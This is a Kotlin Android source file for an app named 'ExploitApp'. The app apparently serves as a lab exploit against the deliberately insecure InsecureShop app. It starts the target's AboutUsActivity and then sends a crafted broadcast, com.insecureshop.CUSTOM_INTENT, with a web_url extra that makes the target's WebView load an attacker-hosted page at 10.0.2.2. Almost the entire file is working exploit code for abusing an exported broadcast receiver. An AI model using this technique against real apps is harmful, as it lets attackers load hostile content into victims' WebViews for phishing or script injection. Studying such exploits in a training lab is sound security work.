package com.attacker.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview

class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "ExploitApp"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d(TAG, "MainActivity started")

        // Launch the vulnerable activity first
        val intent = Intent().apply {
            setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
        }
        try {
            startActivity(intent)
            Log.d(TAG, "Started AboutUsActivity in target app")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start AboutUsActivity: ${e.message}")
        }

        // Send the broadcast after a delay to ensure receiver is registered
        Handler(Looper.getMainLooper()).postDelayed({
            sendExploitBroadcast()
        }, 500)

        // Optional UI

    }

    private fun sendExploitBroadcast() {
        val maliciousUrl = "http://10.0.2.2/index.html"
        val exploitIntent = Intent("com.insecureshop.CUSTOM_INTENT").apply {
            putExtra("web_url", maliciousUrl)
        }
        sendBroadcast(exploitIntent)
        Log.d(TAG, "Broadcast sent with web_url = $maliciousUrl")
    }
}

@Composable
fun ExploitMessage() {
    Text("Exploit executed - check target app's WebView")
}

@Composable
fun ExploitAppTheme(content: @Composable () -> Unit) {
    MaterialTheme(content = content)
}

@Preview(showBackground = true)
@Composable
fun ExploitPreview() {
    ExploitAppTheme {
        ExploitMessage()
    }
}
